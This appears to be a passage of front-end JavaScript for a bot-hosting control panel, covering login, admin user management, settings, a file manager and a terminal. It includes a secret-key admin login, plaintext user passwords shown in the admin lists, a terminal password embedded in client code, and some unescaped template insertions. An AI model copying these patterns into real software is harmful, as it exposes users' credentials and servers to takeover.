            async function showSecretKeyModal() {
                const bodyHTML = `
                    <div style="text-align:center;">
                        <p style="margin-bottom:12px;">Enter Secret Key to login as Admin:</p>
                        <input type="password" id="secretKeyInput" style="width:100%;background:#161b25;border:1px solid #2b3240;color:white;padding:12px;border-radius:8px;outline:none;" />
                    </div>
                `;
                const result = await showCustomModal('🔑', bodyHTML, [
                    { label: 'Cancel', value: false, className: 'btn-cancel' },
                    { label: 'Login', value: true, className: 'btn-confirm' }
                ]);
                if (result) {
                    const secret = document.getElementById('secretKeyInput')?.value;
                    if (!secret) {
                        await customAlert('Enter secret key.', '⚠️');
                        return;
                    }
                    try {
                        const res = await fetch('/api/secret_login', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ secret })
                        });
                        const data = await res.json();
                        if (data.success) {
                            location.reload();
                        } else {
                            await customAlert(data.error || 'Invalid secret', '❌');
                        }
                    } catch(e) {
                        await customAlert('Error: ' + e.message, '❌');
                    }
                }
            }

            // ---------- PROFILE EDIT ----------
            const editProfileBtn = document.getElementById('editProfileBtn');
            if (editProfileBtn) {
                editProfileBtn.addEventListener('click', async function() {
                    const currentUsername = '{{ username }}';
                    const bodyHTML = `
                        <div style="text-align:center;">
                            <div style="font-size:20px; margin-bottom:20px;">✎ Edit Profile</div>
                            <div style="margin-bottom:12px;">
                                <label style="display:block;color:#aaa;font-size:13px;margin-bottom:4px;">New Username</label>
                                <input type="text" id="editUsername" value="${currentUsername}" style="width:100%;background:#161b25;border:1px solid #2b3240;color:white;padding:12px;border-radius:8px;outline:none;" />
                            </div>
                            <div>
                                <label style="display:block;color:#aaa;font-size:13px;margin-bottom:4px;">New Password (leave blank to keep current)</label>
                                <input type="password" id="editPassword" placeholder="New password..." style="width:100%;background:#161b25;border:1px solid #2b3240;color:white;padding:12px;border-radius:8px;outline:none;" />
                            </div>
                        </div>
                    `;
                    const result = await showCustomModal('✎', bodyHTML, [
                        { label: 'Cancel', value: false, className: 'btn-cancel' },
                        { label: 'Save', value: true, className: 'btn-confirm' }
                    ]);
                    if (result) {
                        const newUsername = document.getElementById('editUsername').value.trim();
                        const newPassword = document.getElementById('editPassword').value.trim();
                        try {
                            const res = await fetch('/api/profile', {
                                method: 'PUT',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ username: newUsername, password: newPassword })
                            });
                            const data = await res.json();
                            if (data.success) {
                                if (data.logout) {
                                    await customAlert('Profile updated! You will be logged out.', '✅');
                                    window.location.href = '/';
                                } else {
                                    await customAlert('Profile updated!', '✅');
                                    location.reload();
                                }
                            } else {
                                await customAlert(data.error || 'Update failed', '❌');
                            }
                        } catch (e) {
                            // Fetch interceptor will handle 401
                        }
                    }
                });
            }

            // ---------- SETTINGS MODAL ----------
            const settingsModalOverlay = document.getElementById('settingsModalOverlay');
            const settingsCancelBtn = document.getElementById('settingsCancelBtn');
            const settingsSaveBtn = document.getElementById('settingsSaveBtn');
            const settingsWebsiteName = document.getElementById('settingsWebsiteName');
            const settingsTelegram = document.getElementById('settingsTelegram');
            const settingsYoutube = document.getElementById('settingsYoutube');
            const settingsInstagram = document.getElementById('settingsInstagram');
            const settingsTiktok = document.getElementById('settingsTiktok');
            const settingsLogoInput = document.getElementById('settingsLogoInput');
            const settingsLogoPreview = document.getElementById('settingsLogoPreview');
            const settingsRemoveLogoBtn = document.getElementById('settingsRemoveLogoBtn');

            let currentSettings = {};

            async function loadSettings() {
                try {
                    const res = await fetch('/api/settings');
                    const data = await res.json();
                    currentSettings = data;
                    settingsWebsiteName.value = data.website_name || 'YUVICODEX';
                    settingsTelegram.value = data.social_links?.telegram || '#';
                    settingsYoutube.value = data.social_links?.youtube || '#';
                    settingsInstagram.value = data.social_links?.instagram || '#';
                    settingsTiktok.value = data.social_links?.tiktok || '#';
                    if (data.logo) {
                        settingsLogoPreview.innerHTML = `<img src="${data.logo}" class="logo-preview" />`;
                    } else {
                        settingsLogoPreview.innerHTML = '';
                    }
                } catch (e) {
                    console.error('Failed to load settings', e);
                }
            }

            async function saveSettings() {
                const payload = {
                    website_name: settingsWebsiteName.value.trim() || 'YUVICODEX',
                    social_links: {
                        telegram: settingsTelegram.value.trim() || '#',
                        youtube: settingsYoutube.value.trim() || '#',
                        instagram: settingsInstagram.value.trim() || '#',
                        tiktok: settingsTiktok.value.trim() || '#'
                    }
                };
                try {
                    const res = await fetch('/api/settings', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                    const data = await res.json();
                    if (data.success) {
                        await customAlert('Settings saved successfully!', '✅');
                        closeSettingsModal();
                        location.reload();
                    } else {
                        await customAlert('Failed to save settings.', '❌');
                    }
                } catch (e) {
                    // Fetch interceptor handles 401
                }
            }

            async function uploadLogo(file) {
                const formData = new FormData();
                formData.append('logo', file);
                try {
                    const res = await fetch('/api/settings/logo', {
                        method: 'POST',
                        body: formData
                    });
                    const data = await res.json();
                    if (data.success) {
                        await customAlert('Logo uploaded!', '✅');
                        await loadSettings();
                        location.reload();
                    } else {
                        await customAlert(data.error || 'Upload failed', '❌');
                    }
                } catch (e) {
                    // handled by interceptor
                }
            }

            async function removeLogo() {
                const confirmed = await customConfirm('Remove logo?', '🗑️');
                if (!confirmed) return;
                try {
                    const res = await fetch('/api/settings/logo', { method: 'DELETE' });
                    const data = await res.json();
                    if (data.success) {
                        await customAlert('Logo removed.', '✅');
                        await loadSettings();
                        closeSettingsModal();
                        setTimeout(() => { location.reload(); }, 500);
                    } else {
                        await customAlert('Failed to remove logo.', '❌');
                    }
                } catch (e) {
                    // handled by interceptor
                }
            }

            function openSettingsModal() {
                loadSettings();
                settingsModalOverlay.classList.add('open');
            }

            function closeSettingsModal() {
                settingsModalOverlay.classList.remove('open');
            }

            settingsCancelBtn.addEventListener('click', closeSettingsModal);
            settingsSaveBtn.addEventListener('click', saveSettings);
            settingsRemoveLogoBtn.addEventListener('click', removeLogo);
            settingsLogoInput.addEventListener('change', function() {
                if (this.files.length > 0) {
                    uploadLogo(this.files[0]);
                    this.value = '';
                }
            });
            settingsModalOverlay.addEventListener('click', function(e) {
                if (e.target === this) closeSettingsModal();
            });

            // ---------- DOM REFS ----------
            const loginView = document.getElementById('loginView');
            const userView = document.getElementById('userView');
            const adminOverlay = document.getElementById('adminOverlay');

            const loginUsername = document.getElementById('loginUsername');
            const loginPassword = document.getElementById('loginPassword');
            const loginRoleSelect = document.getElementById('loginRoleSelect');
            const loginBtn = document.getElementById('loginBtn');
            const loginError = document.getElementById('loginError');

            const hamburgerBtn = document.getElementById('hamburgerBtn');
            const adminCloseBtn = document.getElementById('adminCloseBtn');
            const logoutBtn = document.getElementById('logoutBtn');

            const botListContainer = document.getElementById('botListContainer');
            const consoleDiv = document.getElementById('console');
            const uploadCard = document.getElementById('uploadCard');
            const deployBtn = document.getElementById('deployBtn');
            const fileInput = document.getElementById('fileInput');
            const settingsIcon = document.getElementById('settingsIcon');
            const fileCountDisplay = document.getElementById('fileCountDisplay');

            const fullUserListContainer = document.getElementById('fullUserListContainer');
            const simpleAdminListContainer = document.getElementById('simpleAdminListContainer');
            const simpleUserListContainer = document.getElementById('simpleUserListContainer');

            const toggleCreateUserBtn = document.getElementById('toggleCreateUserBtn');
            const createUserForm = document.getElementById('createUserForm');
            const newUsername = document.getElementById('newUsername');
            const newPassword = document.getElementById('newPassword');
            const newExpiry = document.getElementById('newExpiry');
            const newRole = document.getElementById('newRole');
            const createUserBtn = document.getElementById('createUserBtn');

            const terminalOutput = document.getElementById('terminalOutput');
            const terminalCommand = document.getElementById('terminalCommand');
            const termRunBtn = document.getElementById('termRunBtn');
            const termStopBtn = document.getElementById('termStopBtn');
            const termClearBtn = document.getElementById('termClearBtn');
            const TERM_PASSWORD = '{{ password }}';

            // ---------- STATE ----------
            let currentUser = null;
            let selectedBotId = null;
            let logPollInterval = null;
            let uptimeIntervals = {};
            let terminalPollInterval = null;
            let isTerminalRunning = false;
            let terminalInputBuffer = '';

            // ---------- COPY CONSOLE ----------
        

            // ---------- API HELPERS ----------
            async function apiCall(url, options = {}) {
                const res = await fetch(url, {
                    ...options,
                    headers: { 'Content-Type': 'application/json', ...options.headers }
                });
                if (!res.ok) {
                    const err = await res.json().catch(() => ({}));
                    throw new Error(err.error || 'API error');
                }
                return res.json();
            }

            // ---------- LOGIN / LOGOUT ----------
            async function handleLogin() {
                const username = loginUsername.value.trim();
                const password = loginPassword.value.trim();
                const role = loginRoleSelect.value;
                loginError.textContent = '';
                if (!username || !password) {
                    loginError.textContent = 'Please enter username and password.';
                    return;
                }
                try {
                    const data = await apiCall('/login', {
                        method: 'POST',
                        body: JSON.stringify({ username, password, role })
                    });
                    if (data.success) {
                        currentUser = { username: data.username, role: data.role };
                        location.reload();
                    }
                } catch (e) {
                    loginError.textContent = e.message || 'Login failed';
                }
            }

            async function handleLogout() {
                const confirmed = await customConfirm('Logout?', '👋');
                if (!confirmed) return;
                try {
                    await apiCall('/logout', { method: 'POST' });
                } catch (_) {}
                location.reload();
            }

            // ---------- BOT LIST ----------
            async function loadBots() {
                try {
                    const bots = await apiCall('/api/bots');
                    renderBots(bots);
                } catch (e) {
                    console.error('Failed to load bots:', e);
                    botListContainer.innerHTML = `<div class="empty-msg">Error loading bots</div>`;
                }
            }

            function renderBots(bots) {
                if (!bots || bots.length === 0) {
                    botListContainer.innerHTML = `<div class="empty-msg">No bots deployed. Upload a project!</div>`;
                    return;
                }
                let html = '';
                bots.forEach(bot => {
                    const statusClass = bot.status === 'running' ? 'running' : 'stopped';
                    const uptimeDisplay = bot.status === 'running' && bot.start_time ?
                        formatUptime(Date.now() / 1000 - bot.start_time) :
                        '--';
                    const selected = (bot.id === selectedBotId) ? 'selected' : '';
                    const ownerDisplay = bot.user || 'unknown';
                    const hasToken = bot.has_token || false;
                    const botUsername = bot.bot_username || null;
                    html += `
                        <div class="bot-card ${selected}" data-id="${bot.id}" data-start-time="${bot.start_time || ''}">
                            <div class="bot-header">
                                <span class="bot-name">${escapeHtml(bot.filename)}</span>
                                <span class="bot-status ${statusClass}">● ${bot.status.toUpperCase()}</span>
                            </div>
                            <div class="bot-owner">👤 ${escapeHtml(ownerDisplay)}</div>
                            <div class="bot-uptime" id="uptime-${bot.id}">UPTIME: ${uptimeDisplay}</div>
                            <div class="bot-controls">
                                <button class="btn-start" data-action="start">${bot.status === 'running' ? '▶ RUNNING' : '▶ START'}</button>
                                <button class="btn-stop" data-action="stop">⏹ STOP</button>
                                <button class="btn-edit" data-action="edit">✎ EDIT</button>
                                <button class="btn-restart" data-action="restart">⟳ RESTART</button>
                                <button class="btn-download" data-action="download">⬇ DOWNLOAD</button>
                                <button class="btn-delete" data-action="delete">🗑 DELETE</button>
                                ${(hasToken && botUsername) ? `<button class="btn-openbot" data-action="openbot" data-bot="${botUsername}">🤖 Open Bot</button>` : ''}
                            </div>
                        </div>
                    `;
                });
                botListContainer.innerHTML = html;

                // Attach events
                document.querySelectorAll('.bot-card').forEach(card => {
                    card.addEventListener('click', function(e) {
                        if (e.target.closest('button')) return;
                        const id = this.dataset.id;
                        selectBot(id);
                    });
                });

                document.querySelectorAll('.bot-card [data-action]').forEach(btn => {
                    btn.addEventListener('click', async function(e) {
                        e.stopPropagation();
                        const action = this.dataset.action;
                        const card = this.closest('.bot-card');
                        const botId = card.dataset.id;
                        const originalText = this.textContent;
                        this.disabled = true;
                        if (action === 'start') this.textContent = '⏳ Starting...';
                        else if (action === 'stop') this.textContent = '⏳ Stopping...';
                        else if (action === 'restart') this.textContent = '⏳ Restarting...';
                        else if (action === 'delete') this.textContent = '⏳ Deleting...';
                        else if (action === 'edit') { /* don't disable */ }
                        else if (action === 'download') { /* don't disable */ }
                        else if (action === 'openbot') { /* don't disable */ }
                        try {
                            if (action === 'openbot') {
                                const botUsername = this.dataset.bot;
                                if (botUsername) {
                                    window.open(`https://t.me/${botUsername}`, '_blank');
                                    await customAlert(`🤖 Opening @${botUsername}`, '✅');
                                }
                                this.disabled = false;
                                this.textContent = originalText;
                                return;
                            }
                            if (action === 'edit') {
                                await openEditModal(botId);
                                this.disabled = false;
                                this.textContent = originalText;
                                return;
                            }
                            if (action === 'download') {
                                window.open(`/api/bots/${botId}/download`, '_blank');
                                this.disabled = false;
                                this.textContent = originalText;
                                return;
                            }
                            await handleBotAction(botId, action);
                        } catch (e) {
                            // error already handled
                        } finally {
                            if (action !== 'edit' && action !== 'download' && action !== 'openbot') {
                                this.disabled = false;
                                this.textContent = originalText;
                            }
                        }
                    });
                });

                // Start live uptime updates for running bots
                bots.forEach(bot => {
                    if (bot.status === 'running' && bot.start_time) {
                        startUptimeUpdate(bot.id, bot.start_time);
                    }
                });

                if (!selectedBotId && bots.length > 0) {
                    selectBot(bots[0].id);
                }
            }

            function startUptimeUpdate(botId, startTime) {
                if (uptimeIntervals[botId]) clearInterval(uptimeIntervals[botId]);
                const el = document.getElementById('uptime-' + botId);
                if (!el) return;
                uptimeIntervals[botId] = setInterval(() => {
                    const now = Date.now() / 1000;
                    const diff = now - startTime;
                    el.textContent = 'UPTIME: ' + formatUptime(diff);
                }, 1000);
            }

            function stopUptimeUpdate(botId) {
                if (uptimeIntervals[botId]) {
                    clearInterval(uptimeIntervals[botId]);
                    delete uptimeIntervals[botId];
                }
            }

            function selectBot(botId) {
                selectedBotId = botId;
                document.querySelectorAll('.bot-card').forEach(c => c.classList.remove('selected'));
                const card = document.querySelector(`.bot-card[data-id="${botId}"]`);
                if (card) card.classList.add('selected');
                loadLogs(botId);
                if (logPollInterval) clearInterval(logPollInterval);
                logPollInterval = setInterval(() => loadLogs(botId, true), 3000);
            }

            async function loadLogs(botId, silent = false) {
                try {
                    const data = await apiCall(`/api/bots/${botId}/logs`);
                    consoleDiv.textContent = data.logs || 'No logs yet.';
                } catch (e) {
                    if (!silent) consoleDiv.textContent = 'Error loading logs.';
                }
            }

            async function handleBotAction(botId, action) {
                try {
                    if (action === 'start') {
                        await apiCall(`/api/bots/${botId}/start`, { method: 'POST' });
                    } else if (action === 'stop') {
                        await apiCall(`/api/bots/${botId}/stop`, { method: 'POST' });
                    } else if (action === 'restart') {
                        await apiCall(`/api/bots/${botId}/restart`, { method: 'POST' });
                    } else if (action === 'delete') {
                        const confirmed = await customConfirm('Delete this bot?', '🗑️');
                        if (!confirmed) return;
                        await apiCall(`/api/bots/${botId}`, { method: 'DELETE' });
                        if (selectedBotId === botId) {
                            selectedBotId = null;
                            if (logPollInterval) clearInterval(logPollInterval);
                            consoleDiv.textContent = 'Bot deleted.';
                        }
                    } else {
                        return;
                    }
                    await loadBots();
                } catch (e) {
                    await customAlert(e.message || 'Action failed', '❌');
                }
            }

            // ---------- EDIT MODAL ----------
            async function openEditModal(botId) {
                try {
                    const data = await apiCall(`/api/bots/${botId}/content`);
                    const content = data.content || '';
                    const bodyHTML = `
                        <div style="margin-bottom:8px;">
                            <button class="btn-sm" id="copyAllBtn" style="padding:6px 14px;font-size:0.55rem;border:1px solid #33ddff;color:#33ddff;background:transparent;border-radius:6px;cursor:pointer;">
                                📋 Copy All
                            </button>
                        </div>
                        <textarea id="editFileContent" rows="15" style="width:100%;background:#050807;color:#00ff88;border:1px solid #333;border-radius:6px;padding:10px;font-family:'Courier New',monospace;font-size:0.7rem;resize:vertical;tab-size:4;">${escapeHtml(content)}</textarea>
                    `;
                    const result = await showCustomModal('✎ Edit File', bodyHTML, [
                        { label: 'Cancel', value: false, className: 'btn-cancel' },
                        { label: '💾 SAVE', value: true, className: 'btn-confirm' }
                    ]);
                    if (result) {
                        const newContent = document.getElementById('editFileContent').value;
                        try {
                            await apiCall(`/api/bots/${botId}/content`, {
                                method: 'PUT',
                                body: JSON.stringify({ content: newContent })
                            });
                            await customAlert('File saved and bot restarted (if running).', '✅');
                            await loadBots();
                        } catch (e) {
                            await customAlert(e.message, '❌');
                        }
                    }
                    setTimeout(() => {
                        const copyBtn = document.getElementById('copyAllBtn');
                        if (copyBtn) {
                            copyBtn.onclick = function() {
                                const textarea = document.getElementById('editFileContent');
                                textarea.select();
                                try {
                                    navigator.clipboard.writeText(textarea.value).then(() => {
                                        customAlert('📋 Copied all code!', '✅');
                                    }).catch(() => {
                                        document.execCommand('copy');
                                        customAlert('📋 Copied!', '✅');
                                    });
                                } catch(e) {
                                    document.execCommand('copy');
                                    customAlert('📋 Copied!', '✅');
                                }
                            };
                        }
                    }, 100);
                } catch (e) {
                    await customAlert(e.message, '❌');
                }
            }

            // ---------- UPLOAD ----------
            uploadCard.addEventListener('click', function(e) {
                if (e.target.closest('.settings-icon') || e.target.closest('.deploy-btn')) return;
                fileInput.click();
            });

            deployBtn.addEventListener('click', async function() {
                if (fileInput.files.length === 0) {
                    await customAlert('Please select at least one file first.', '⚠️');
                    return;
                }
                const formData = new FormData();
                for (let i = 0; i < fileInput.files.length; i++) {
                    formData.append('files[]', fileInput.files[i]);
                }
                try {
                    deployBtn.textContent = 'UPLOADING...';
                    deployBtn.disabled = true;
                    const res = await fetch('/upload', {
                        method: 'POST',
                        body: formData
                    });
                    const data = await res.json();
                    if (data.success) {
                        await customAlert(`Uploaded! ${data.bots_created} bot(s) created.`, '✅');
                        await loadBots();
                        fileInput.value = '';
                        fileCountDisplay.textContent = '';
                    } else {
                        await customAlert(data.error || 'Upload failed', '❌');
                    }
                } catch (e) {
                    // handled by interceptor
                } finally {
                    deployBtn.textContent = 'DEPLOY SERVER';
                    deployBtn.disabled = false;
                }
            });

            fileInput.addEventListener('change', function() {
                const count = this.files.length;
                if (count === 0) {
                    fileCountDisplay.textContent = '';
                } else {
                    const names = Array.from(this.files).map(f => f.name).join(', ');
                    fileCountDisplay.textContent = `${count} file(s) selected: ${names}`;
                }
            });

            // ---------- SETTINGS ICON ----------
            if (settingsIcon) {
                settingsIcon.addEventListener('click', function(e) {
                    e.stopPropagation();
                    openSettingsModal();
                });
            }

            // ---------- ADMIN PANEL ----------
            function openAdminPanel() {
                if (!currentUser) {
                    customAlert('Please login first.', '⚠️');
                    return;
                }
                if (currentUser.role !== 'admin') {
                    const username = currentUser.username;
                    const password = '{{ user_password }}';
                    const bodyHTML = `
                        <div style="text-align:center;">
                            <div style="font-size:20px; margin-bottom:20px;">👤 Your Profile</div>
                            <div style="background:#161b25; padding:15px; border-radius:10px; margin-bottom:10px;">
                                <strong style="color:#00e5ff;">Username</strong><br />
                                <span style="font-size:18px; color:#fff;">${username}</span>
                            </div>
                            <div style="background:#161b25; padding:15px; border-radius:10px;">
                                <strong style="color:#00e5ff;">Password</strong><br />
                                <span style="font-size:18px; color:#fff;">${password}</span>
                            </div>
                        </div>
                    `;
                    showCustomModal('ℹ️', bodyHTML, [
                        { label: 'OK', value: true, className: 'btn-ok' }
                    ]);
                    return;
                }
                loadAdminUsers();
                adminOverlay.classList.add('open');
            }

            function closeAdminPanel() {
                adminOverlay.classList.remove('open');
            }

            // ---------- USER MANAGEMENT ----------
            async function loadAdminUsers() {
                try {
                    const users = await apiCall('/api/users');
                    renderFullUserList(users);
                    renderSimpleLists(users);
                } catch (e) {
                    console.error('Failed to load users:', e);
                }
            }

            function renderFullUserList(users) {
                if (!users || users.length === 0) {
                    fullUserListContainer.innerHTML = `<div class="empty-msg">No users found.</div>`;
                    return;
                }
                let html = '';
                users.forEach((u, idx) => {
                    const bannedClass = u.banned ? 'banned' : (u.role === 'admin' ? 'admin' : 'user');
                    const bannedText = u.banned ? 'UNBAN' : 'BAN';
                    const roleLabel = u.role.toUpperCase();
                    let expiryDisplay = 'Never';
                    if (u.expires_at) {
                        try {
                            const exp = new Date(u.expires_at);
                            expiryDisplay = exp.toLocaleString();
                        } catch(e) { expiryDisplay = 'Invalid'; }
                    }
                    html += `
                        <div class="list-item" data-username="${u.username}">
                            <div class="row">
                                <div class="info">
                                    <span class="uname">${escapeHtml(u.username)}</span>
                                    <span class="upass">🔑 ${escapeHtml(u.password)}</span>
                                    <span style="font-size:12px;color:#888;">Expires: ${expiryDisplay}</span>
                                </div>
                                <span class="badge-role ${bannedClass}">${u.banned ? 'BANNED' : roleLabel}</span>
                            </div>
                            <div class="row">
                                <div class="limit-group">
                                    <label>Limit:</label>
                                    <input type="number" class="limit-input" value="${u.limit || 0}" min="0" step="1" />
                                </div>
                                <button class="btn-action btn-set" data-action="setLimit" data-username="${u.username}">SET</button>
                                <button class="btn-action btn-ban" data-action="toggleBan" data-username="${u.username}">${bannedText}</button>
                            </div>
                            <div class="row">
                                <input type="text" placeholder="New password..." style="flex:2;background:#1a1a1a;border:1px solid #333;color:#fff;padding:8px 10px;border-radius:5px;outline:none;" data-field="newPass" />
                                <button class="btn-action btn-reset" data-action="resetPass" data-username="${u.username}">RESET PW</button>
                            </div>
                            <div class="row">
                                <input type="text" placeholder="New expiry (e.g. 5, 1m, 2h)" style="flex:2;background:#1a1a1a;border:1px solid #333;color:#fff;padding:8px 10px;border-radius:5px;outline:none;" data-field="newExpiry" />
                                <button class="btn-action btn-set" data-action="setExpiry" data-username="${u.username}">SET EXPIRY</button>
                            </div>
                            <button class="btn-action btn-del" data-action="deleteUser" data-username="${u.username}">DELETE USER + ALL BOTS</button>
                        </div>
                    `;
                });
                fullUserListContainer.innerHTML = html;
                attachFullListEvents();
            }

            function attachFullListEvents() {
                document.querySelectorAll('#fullUserListContainer [data-action]').forEach(btn => {
                    btn.addEventListener('click', async function(e) {
                        e.stopPropagation();
                        const action = this.dataset.action;
                        const username = this.dataset.username;
                        const card = this.closest('.list-item');
                        if (action === 'setLimit') {
                            const input = card.querySelector('.limit-input');
                            const val = parseInt(input.value, 10);
                            if (isNaN(val) || val < 0) {
                                await customAlert('Enter a valid number.', '⚠️');
                                return;
                            }
                            try {
                                await apiCall(`/api/users/${username}`, {
                                    method: 'PUT',
                                    body: JSON.stringify({ limit: val })
                                });
                                await loadAdminUsers();
                            } catch (e) {
                                await customAlert(e.message, '❌');
                            }
                        } else if (action === 'toggleBan') {
                            const user = (await apiCall('/api/users')).find(u => u.username === username);
                            if (!user) return;
                            try {
                                await apiCall(`/api/users/${username}`, {
                                    method: 'PUT',
                                    body: JSON.stringify({ banned: !user.banned })
                                });
                                await loadAdminUsers();
                            } catch (e) {
                                await customAlert(e.message, '❌');
                            }
                        } else if (action === 'resetPass') {
                            const passInput = card.querySelector('[data-field="newPass"]');
                            const newPass = passInput.value.trim();
                            if (!newPass) {
                                await customAlert('Enter a new password.', '⚠️');
                                return;
                            }
                            try {
                                await apiCall(`/api/users/${username}`, {
                                    method: 'PUT',
                                    body: JSON.stringify({ password: newPass })
                                });
                                passInput.value = '';
                                await customAlert('Password updated.', '✅');
                                await loadAdminUsers();
                            } catch (e) {
                                await customAlert(e.message, '❌');
                            }
                        } else if (action === 'setExpiry') {
                            const expiryInput = card.querySelector('[data-field="newExpiry"]');
                            const expiry = expiryInput.value.trim();
                            try {
                                await apiCall(`/api/users/${username}`, {
                                    method: 'PUT',
                                    body: JSON.stringify({ expiry: expiry })
                                });
                                expiryInput.value = '';
                                await customAlert('Expiry updated.', '✅');
                                await loadAdminUsers();
                            } catch (e) {
                                await customAlert(e.message, '❌');
                            }
                        } else if (action === 'deleteUser') {
                            const confirmed = await customConfirm(`Delete user ${username} and all their bots?`, '🗑️');
                            if (!confirmed) return;
                            if (username === currentUser.username) {
                                await customAlert('Cannot delete yourself.', '🚫');
                                return;
                            }
                            try {
                                await apiCall(`/api/users/${username}`, { method: 'DELETE' });
                                await loadAdminUsers();
                            } catch (e) {
                                await customAlert(e.message, '❌');
                            }
                        }
                    });
                });
            }

            function renderSimpleLists(users) {
                const admins = users.filter(u => u.role === 'admin' && !u.banned);
                const regulars = users.filter(u => u.role === 'user' && !u.banned);

                if (!admins.length) {
                    simpleAdminListContainer.innerHTML = `<div class="empty-msg">No admins.</div>`;
                } else {
                    let html = '';
                    admins.forEach(u => {
                        html += `
                            <div class="simple-list-item" data-username="${u.username}">
                                <div class="info">
                                    <span class="uname">${escapeHtml(u.username)}</span>
                                    <span class="upass">🔑 ${escapeHtml(u.password)}</span>
                                </div>
                                <div class="actions">
                                    <button class="btn-remove-simple" data-username="${u.username}">REMOVE</button>
                                </div>
                            </div>
                        `;
                    });
                    simpleAdminListContainer.innerHTML = html;
                }

                if (!regulars.length) {
                    simpleUserListContainer.innerHTML = `<div class="empty-msg">No users.</div>`;
                } else {
                    let html = '';
                    regulars.forEach(u => {
                        html += `
                            <div class="simple-list-item" data-username="${u.username}">
                                <div class="info">
                                    <span class="uname">${escapeHtml(u.username)}</span>
                                    <span class="upass">🔑 ${escapeHtml(u.password)}</span>
                                </div>
                                <div class="actions">
                                    <button class="btn-remove-simple" data-username="${u.username}">REMOVE</button>
                                </div>
                            </div>
                        `;
                    });
                    simpleUserListContainer.innerHTML = html;
                }

                document.querySelectorAll('.btn-remove-simple').forEach(btn => {
                    btn.addEventListener('click', async function(e) {
                        e.stopPropagation();
                        const username = this.dataset.username;
                        const confirmed = await customConfirm(`Remove user ${username}?`, '🗑️');
                        if (!confirmed) return;
                        if (username === currentUser.username) {
                            await customAlert('Cannot remove yourself.', '🚫');
                            return;
                        }
                        try {
                            await apiCall(`/api/users/${username}`, { method: 'DELETE' });
                            await loadAdminUsers();
                        } catch (e) {
                            await customAlert(e.message, '❌');
                        }
                    });
                });
            }

            // ---------- CREATE USER ----------
            async function handleCreateUser() {
                const username = newUsername.value.trim();
                const password = newPassword.value.trim();
                const expiry = newExpiry.value.trim();
                const role = newRole.value;
                if (!username || !password) {
                    await customAlert('Username and Password required.', '⚠️');
                    return;
                }
                try {
                    await apiCall('/api/users', {
                        method: 'POST',
                        body: JSON.stringify({ username, password, role, expiry })
                    });
                    await loadAdminUsers();
                    newUsername.value = '';
                    newPassword.value = '';
                    newExpiry.value = '';
                    createUserForm.style.display = 'none';
                    await customAlert(`User ${username} created.`, '✅');
                } catch (e) {
                    await customAlert(e.message || 'Creation failed', '❌');
                }
            }

            // ---------- FILE MANAGER ----------
            const fileManagerList = document.getElementById('fileManagerList');
            const fileBreadcrumb = document.getElementById('fileBreadcrumb');
            const contextMenu = document.getElementById('fileContextMenu');
            const ctxDelete = document.getElementById('ctxDelete');
            const ctxRename = document.getElementById('ctxRename');
            const ctxDownload = document.getElementById('ctxDownload');

            let currentPath = '';
            let selectedFilePath = null;

            async function loadDirectory(path = '') {
                currentPath = path;
                try {
                    const res = await fetch(`/api/files?path=${encodeURIComponent(path)}`);
                    if (!res.ok) {
                        const err = await res.json();
                        await customAlert(err.error || 'Failed to load', '❌');
                        return;
                    }
                    const data = await res.json();
                    renderFileList(data);
                } catch (e) {
                    await customAlert('Error: ' + e.message, '❌');
                }
            }

            function renderFileList(data) {
                const items = data.items || [];
                let breadHtml = '';
                const parts = currentPath.split('/').filter(p => p);
                let cum = '';
                breadHtml += `<span onclick="window._loadDirectory('')">📁 root</span>`;
                parts.forEach((p, idx) => {
                    cum += (cum ? '/' : '') + p;
                    breadHtml += `<span class="sep">/</span><span onclick="window._loadDirectory('${cum}')">${escapeHtml(p)}</span>`;
                });
                fileBreadcrumb.innerHTML = breadHtml;

                let html = '';
                if (currentPath) {
                    html += `<div class="file-item" onclick="window._loadDirectory('${currentPath.split('/').slice(0, -1).join('/')}')">
                        <span class="name"><i class="fa-solid fa-arrow-up"></i> ..</span>
                    </div>`;
                }
                items.forEach(item => {
                    const icon = item.type === 'directory' ? '<i class="fa-solid fa-folder dir-icon"></i>' : '<i class="fa-solid fa-file"></i>';
                    const sizeText = item.type === 'file' ? (item.size / 1024).toFixed(1) + ' KB' : '';
                    html += `
                        <div class="file-item" data-path="${item.path}" data-type="${item.type}">
                            <span class="name">${icon} ${escapeHtml(item.name)}</span>
                            <span class="size">${sizeText}</span>
                        </div>
                    `;
                });
                fileManagerList.innerHTML = html;

                document.querySelectorAll('.file-item').forEach(el => {
                    el.addEventListener('click', function(e) {
                        const path = this.dataset.path;
                        const type = this.dataset.type;
                        if (type === 'directory') {
                            window._loadDirectory(path);
                        } else {
                            document.querySelectorAll('.file-item').forEach(f => f.classList.remove('selected'));
                            this.classList.add('selected');
                            selectedFilePath = path;
                        }
                    });

                    let timer;
                    el.addEventListener('touchstart', function(e) {
                        timer = setTimeout(() => {
                            e.preventDefault();
                            const path = this.dataset.path;
                            showContextMenu(e.touches[0].clientX, e.touches[0].clientY, path);
                            document.querySelectorAll('.file-item').forEach(f => f.classList.remove('selected'));
                            this.classList.add('selected');
                            selectedFilePath = path;
                        }, 3000);
                    });
                    el.addEventListener('touchend', function() { clearTimeout(timer); });
                    el.addEventListener('touchmove', function() { clearTimeout(timer); });

                    el.addEventListener('contextmenu', function(e) {
                        e.preventDefault();
                        const path = this.dataset.path;
                        showContextMenu(e.clientX, e.clientY, path);
                        document.querySelectorAll('.file-item').forEach(f => f.classList.remove('selected'));
                        this.classList.add('selected');
                        selectedFilePath = path;
                    });
                });
            }

            function showContextMenu(x, y, path) {
                contextMenu.style.display = 'block';
                contextMenu.style.left = x + 'px';
                contextMenu.style.top = y + 'px';
                contextMenu.dataset.path = path;
            }

            function hideContextMenu() {
                contextMenu.style.display = 'none';
            }

            ctxDelete.addEventListener('click', async function() {
                const path = contextMenu.dataset.path || selectedFilePath;
                if (!path) return;
                hideContextMenu();
                const confirmed = await customConfirm(`Delete ${path}?`, '🗑️');
                if (!confirmed) return;
                try {
                    const res = await fetch('/api/files/delete', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ path })
                    });
                    const data = await res.json();
                    if (data.success) {
                        await customAlert('Deleted.', '✅');
                        loadDirectory(currentPath);
                    } else {
                        await customAlert(data.error || 'Delete failed', '❌');
                    }
                } catch (e) {
                    // handled by interceptor
                }
            });

